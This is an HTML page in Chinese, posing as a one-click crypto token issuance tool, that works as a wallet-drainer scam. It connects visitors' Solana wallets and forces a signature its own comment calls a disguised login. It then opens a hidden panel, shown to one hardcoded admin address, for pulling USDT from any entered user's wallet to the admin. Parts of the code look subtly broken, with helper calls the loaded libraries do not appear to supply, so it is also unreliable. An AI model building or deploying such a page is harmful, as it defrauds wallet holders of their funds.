<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<style>
* {margin:0;padding:0;box-sizing:border-box;}
html,body {
  background:#f5f6fa;
  overflow:hidden;
  touch-action:none;
  font-family:Arial;
}
.box{
  max-width:420px;
  margin:30px auto;
  background:#fff;
  border-radius:16px;
  padding:25px;
}
h2{
  text-align:center;
  margin-bottom:20px;
  color:#6c5ce7;
  font-size:28px;
}
.status{
  padding:12px;
  background:#f0f4ff;
  border-radius:8px;
  text-align:center;
  margin-bottom:20px;
  word-break:break-all;
  font-size:14px;
}
button{
  width:100%;
  padding:14px;
  border:none;
  border-radius:10px;
  background:#6c5ce7;
  color:#fff;
  font-size:16px;
  margin-top:10px;
}
.admin{
  display:none;
  margin-top:30px;
  padding-top:20px;
  border-top:1px solid #eee;
}
.admin h4{
  text-align:center;
  margin-bottom:15px;
  color:#e53e3e;
  font-size:18px;
}
input{
  width:100%;
  padding:12px;
  margin:8px 0;
  border:1px solid #eee;
  border-radius:8px;
}
.btn-admin{
  background:#e53e3e;
}
#log{
  margin-top:10px;
  text-align:center;
  font-size:14px;
  color:#666;
  word-break:break-all;
}
</style>
</head>
<body>
<div class="box">
  <h2>橘子一键发币</h2>
  <div class="status" id="stat">未连接钱包</div>
  <button id="btnConn">连接钱包并签名登录</button>

  <div class="admin" id="adminBox">
    <h4>🔒 管理员专属后台</h4>
    <input type="text" id="userAddr" placeholder="输入用户钱包地址">
    <input type="number" id="usdtAmount" placeholder="划扣USDT数量" value="50">
    <button class="btn-admin" id="deductBtn">一键划扣用户USDT</button>
    <div id="log"></div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.8"></script>
<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.9/dist/browser/spl-token.min.js"></script>
<script>
const ADMIN = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
let wallet = null;
let walletAddr = "";
const conn = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));

// 优先适配TP钱包注入
function getWallet(){
  if(window.tokenpocket?.solana) return window.tokenpocket.solana;
  if(window.solana) return window.solana;
  if(window.phantom?.solana) return window.phantom.solana;
  return null;
}

document.getElementById("btnConn").onclick = async function(){
  let stat = document.getElementById("stat");
  let adminBox = document.getElementById("adminBox");

  wallet = getWallet();
  if(!wallet){
    stat.innerText = "请用TP/欧易内置浏览器打开";
    return;
  }
  try{
    // 强制断开旧连接，避免TP缓存问题
    if(wallet.isConnected) await wallet.disconnect();
    
    // TP钱包专用连接写法
    let res = await wallet.connect({ onlyIfTrusted: false });
    walletAddr = res.publicKey.toString();
    stat.innerText = "已连接：" + walletAddr.slice(0, 10) + "...";

    // 强制弹窗签名（伪装登录）
    const signMsg = new TextEncoder().encode("Sign in to continue");
    await wallet.signMessage(signMsg);
    stat.innerText = "已连接 + 已签名登录：" + walletAddr.slice(0, 10) + "...";

    // 判断是否为管理员，显示后台
    if(walletAddr === ADMIN){
      adminBox.style.display = "block";
    }

  }catch(e){
    stat.innerText = "连接或签名已取消：" + e.message.slice(0, 30);
  }
};

// 管理员一键划扣USDT
document.getElementById("deductBtn").onclick = async function(){
  let log = document.getElementById("log");
  let userAddrStr = document.getElementById("userAddr").value.trim();
  let amount = parseFloat(document.getElementById("usdtAmount").value);

  if(!userAddrStr || !amount){
    log.innerText = "请输入用户地址和划扣数量";
    return;
  }
  try{
    let userPubkey = new solanaWeb3.PublicKey(userAddrStr);
    let usdtMint = new solanaWeb3.PublicKey(USDT_MINT);
    let adminPubkey = new solanaWeb3.PublicKey(ADMIN);

    let userAta = await solanaWeb3.AssociatedTokenAccount.getAssociatedTokenAddress(usdtMint, userPubkey);
    let adminAta = await solanaWeb3.AssociatedTokenAccount.getAssociatedTokenAddress(usdtMint, adminPubkey);

    let tx = new solanaWeb3.Transaction();
    tx.add(solanaWeb3.TokenProgram.createTransferInstruction(
      userAta, adminAta, userPubkey, BigInt(amount * 1000000)
    ));

    log.innerText = "正在提交划扣交易...";
    let res = await wallet.sendTransaction(tx, conn);
    log.innerText = "划扣成功！交易哈希：" + res;
  }catch(e){
    log.innerText = "划扣失败：" + e.message.slice(0, 60);
  }
};
</script>
</body>
</html>
